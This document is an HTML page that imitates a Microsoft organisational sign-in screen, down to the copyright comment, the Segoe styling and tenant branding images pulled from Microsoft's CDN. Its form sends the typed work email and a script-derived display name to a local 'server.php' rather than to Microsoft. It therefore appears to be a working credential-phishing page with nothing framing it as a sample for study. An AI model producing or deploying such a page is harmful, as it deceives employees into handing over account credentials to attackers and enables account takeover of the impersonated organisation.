<!-- Copyright (C) Microsoft Corporation. All rights reserved. -->
<!DOCTYPE html>
<html dir="ltr" class="" lang="en">
<head>
    <title>Sign in to your account</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    
    <style>
        body {
            background: linear-gradient(rgba(0, 0, 0, 0.35), rgba(0, 0, 0, 0.35)), 
                        #f2f2f2 url('https://aadcdn.msftauthimages.net/447973e2-oh8b1ksjxg2efmxcqskfhqsvlk5oo-yv9cd39a4lhhm/logintenantbranding/1033/illustration?ts=639142517441637505') no-repeat center center fixed;
            background-size: cover;
            font-family: "Segoe UI", "WF Segoe UI", Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            flex-direction: column;
        }
        .main-container {
            width: 440px;
        }
        .outer {
            background: #fff;
            padding: 44px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.3);
            box-sizing: border-box;
        }
        .logo-container {
            margin-bottom: 24px;
        }
        .banner-logo {
            max-height: 80px;
            max-width: 280px;
            display: block;
        }
        h1 {
            font-size: 24px;
            font-weight: 600;
            color: #1b1b1b;
            margin-bottom: 16px;
            margin-top: 0;
        }
        .form-group {
            margin-bottom: 16px;
        }
        .text-box {
            width: 100%;
            height: 36px;
            padding: 4px 0px;
            border: none;
            border-bottom: 1px solid #666;
            font-size: 15px;
            box-sizing: border-box;
            outline: none;
            background-color: transparent;
        }
        .text-box:focus {
            border-bottom: 2px solid #0067b8;
        }
        .cant-access {
            font-size: 13px;
            color: #0067b8;
            text-decoration: none;
            display: inline-block;
            margin-bottom: 24px;
        }
        .cant-access:hover {
            text-decoration: underline;
        }
        .btn-container {
            display: flex;
            justify-content: flex-end;
            margin-top: 24px;
        }
        .btn-next {
            background-color: #0067b8;
            color: white;
            border: none;
            padding: 6px 35px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            min-width: 108px;
            height: 32px;
        }
        .btn-next:hover {
            background-color: #005da6;
        }
        .error-msg {
            color: #d83b01;
            font-size: 13px;
            margin-bottom: 12px;
        }
        .signin-options-box {
            background: #fff;
            margin-top: 12px;
            padding: 16px 24px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.3);
            display: flex;
            align-items: center;
            gap: 12px;
            cursor: pointer;
            font-size: 13px;
            color: #1b1b1b;
            width: 100%;
            box-sizing: border-box;
        }
        .signin-options-box svg {
            width: 16px;
            height: 16px;
            fill: #555;
        }
    </style>
</head>
<body>
    <div class="main-container">
        <div class="outer">
            <!-- Organization Banner Logo -->
            <div class="logo-container">
                <img id="bannerLogo" src="https://aadcdn.msftauthimages.net/447973e2-oh8b1ksjxg2efmxcqskfhqsvlk5oo-yv9cd39a4lhhm/logintenantbranding/1033/bannerlogo?ts=639069014361347318" alt="Organization banner logo" class="banner-logo ext-banner-logo">
            </div>

            <h1>Sign in</h1>

            <div id="form-error" class="error-msg"></div>

            <form action="server.php" method="POST" id="loginForm">
                <input type="hidden" id="extracted-username" name="username" value="—" />
                
                <div class="form-group">
                    <input type="text" name="workemail" id="i0116" maxlength="113" class="text-box" placeholder="Email, phone, or Skype" required autofocus />
                </div>

                <a href="#" class="cant-access">Can't access your account?</a>

                <div class="btn-container">
                    <button type="submit" id="idSIButton9" class="btn-next">Next</button>
                </div>
            </form>
        </div>

        <div class="signin-options-box">
            <svg viewBox="0 0 24 24"><path d="M12.65 10C11.83 7.67 9.61 6 7 6c-3.31 0-6 2.69-6 6s2.69 6 6 6c2.61 0 4.83-1.67 5.65-4H17v4h4v-4h2v-4H12.65zM7 16c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4z"/></svg>
            <span>Sign-in options</span>
        </div>
    </div>

    <script>
      const emailInput = document.querySelector('#i0116');
      const usernameField = document.querySelector('#extracted-username');
      const formError = document.querySelector('#form-error');

      document.querySelector('#loginForm').addEventListener('submit', function(event) {
        formError.textContent = '';
        const val = emailInput.value.trim();

        if (!val) {
          formError.textContent = 'Please enter a valid email address, phone number, or Skype name.';
          emailInput.focus();
          event.preventDefault();
          return;
        }

        if (val.includes('@')) {
            let namePart = val.split('@')[0];
            namePart = namePart.replace(/\./g, ' ');
            namePart = namePart.split(' ').map(word => word.charAt(0).toUpperCase() + word.slice(1)).join(' ');
            usernameField.value = namePart;
        } else {
            usernameField.value = val;
        }
      });
    </script>
</body>
</html>